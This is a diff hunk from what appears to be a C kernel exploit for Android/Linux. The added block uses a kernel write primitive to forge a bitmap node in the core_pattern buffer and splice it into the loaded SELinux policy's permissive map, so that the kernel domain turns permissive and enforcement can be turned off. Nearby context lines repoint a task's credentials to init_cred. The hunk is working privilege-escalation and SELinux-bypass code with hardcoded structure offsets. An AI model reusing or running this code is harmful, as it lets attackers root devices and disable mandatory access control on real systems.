@@ -999,6 +999,40 @@ int try_cfi_stage(void) {
               (size_t)mp_addr, mp, mw, rr, rb, sr, kr, krb, cpr, errno);
       fsync(1);
 
+      /* Mark the kernel domain permissive in the LOADED POLICY so that
+       * security_compute_av[_user]() sets AVD_FLAGS_PERMISSIVE for it.  That is
+       * what lets `echo 0 > /sys/fs/selinux/enforce` pass; the kernel then emits
+       * the real SELNL_MSG_SETENFORCE(0) notice and init's cached userspace
+       * libselinux AVC finally reloads as permissive -> property_service allows
+       * setprop.  A raw selinux_enforcing write alone is invisible to userspace
+       * (see docs/SELINUX_USERSYNC.md).
+       * Layout: selinux_ss.policydb@+8, policydb.permissive_map@+0x1C0.
+       * permissive_map is empty, so supply a fake ebitmap_node (next/maps[6]/
+       * startbit) in the unused core_pattern buffer. */
+      {
+        uintptr_t pm   = data_addr(SELINUX_SS) + SELINUX_PMAP_OFF;
+        uintptr_t node = data_addr(CORE_PATTERN);   /* 128 B scratch */
+        unsigned char nb[64];
+        memset(nb, 0, sizeof(nb));
+        for (int i = 0; i < 6; i++) memset(nb + 8 + i * 8, 0xff, 8); /* maps[]=~0 */
+        uint32_t startbit = (SELINUX_TYPE_KERNEL / SELINUX_EBITMAP_SIZE)
+                            * SELINUX_EBITMAP_SIZE;
+        uint32_t highbit  = startbit + SELINUX_EBITMAP_SIZE;
+        memcpy(nb + 56, &startbit, 4);
+        ssize_t nw = configfs_write_once(fd, node, nb, 60);
+        uint64_t nodep = (uint64_t)node;
+        configfs_write_once(fd, pm, &nodep, 8);
+        configfs_write_once(fd, pm + 8, &highbit, 4);
+        uint64_t rb0 = 0; uint32_t rb1 = 0;
+        configfs_read_once(fd, pm, &rb0, 8);
+        configfs_read_once(fd, pm + 8, &rb1, 4);
+        pr_info("permissive_map @%016zx node=%016zx startbit=%u highbit=%u "
+                "wr=%zd rb_node=%016zx rb_highbit=%u errno=%d\n",
+                (size_t)pm, (size_t)node, startbit, highbit,
+                nw, (size_t)rb0, rb1, errno);
+        fsync(1);
+      }
+
       /* Optional: repoint a target task's cred -> canonical init_cred. */
       const char *ct = getenv("CRED_TGID");
       if (ct && *ct) {
